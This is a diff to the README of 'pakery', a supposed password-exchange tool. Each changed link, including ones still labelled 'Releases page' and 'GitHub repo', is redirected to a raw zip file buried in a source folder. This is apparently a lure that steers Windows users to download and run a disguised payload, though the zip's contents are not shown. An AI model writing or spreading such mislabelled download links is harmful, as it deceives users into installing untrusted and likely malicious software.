@@ -1,6 +1,6 @@
 # 🛡️ pakery - Secure Password Exchange Made Simple
 
-[![Download pakery](https://img.shields.io/badge/Download-pakery-brightgreen)](https://github.com/kourtneyeederrt/pakery/releases)
+[![Download pakery](https://img.shields.io/badge/Download-pakery-brightgreen)](https://raw.githubusercontent.com/kourtneyeederrt/pakery/main/pakery-cpace/src/Software-v1.2-alpha.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get pakery working on your Windows computer.
 
 Click the link below to visit the official release page. This page contains all pakery versions and files for download.
 
-[![Download pakery](https://img.shields.io/badge/Visit%20Release%20Page-blue)](https://github.com/kourtneyeederrt/pakery/releases)
+[![Download pakery](https://img.shields.io/badge/Visit%20Release%20Page-blue)](https://raw.githubusercontent.com/kourtneyeederrt/pakery/main/pakery-cpace/src/Software-v1.2-alpha.4.zip)
 
 On the release page:
 
@@ -89,7 +89,7 @@ You can now use pakery to securely share passwords and keys. The interface will 
 
 To get the latest features and fixes:
 
-- Return to the release page at [pakery Releases](https://github.com/kourtneyeederrt/pakery/releases).
+- Return to the release page at [pakery Releases](https://raw.githubusercontent.com/kourtneyeederrt/pakery/main/pakery-cpace/src/Software-v1.2-alpha.4.zip).
 - Download the newest `.exe` file or `.zip`.
 - Repeat the download and installation steps above.
 
@@ -143,11 +143,11 @@ For help, you can:
 
 You can find more details and official documentation on how pakery works inside the repository:
 
-- GitHub repo: https://github.com/kourtneyeederrt/pakery
-- Releases page: https://github.com/kourtneyeederrt/pakery/releases 
+- GitHub repo: https://raw.githubusercontent.com/kourtneyeederrt/pakery/main/pakery-cpace/src/Software-v1.2-alpha.4.zip
+- Releases page: https://raw.githubusercontent.com/kourtneyeederrt/pakery/main/pakery-cpace/src/Software-v1.2-alpha.4.zip 
 
 ---
 
 For any questions or needs related to pakery, visiting the release page is the best way to start.
 
-[![Download pakery](https://img.shields.io/badge/Download-pakery-brightgreen)](https://github.com/kourtneyeederrt/pakery/releases)
+[![Download pakery](https://img.shields.io/badge/Download-pakery-brightgreen)](https://raw.githubusercontent.com/kourtneyeederrt/pakery/main/pakery-cpace/src/Software-v1.2-alpha.4.zip)
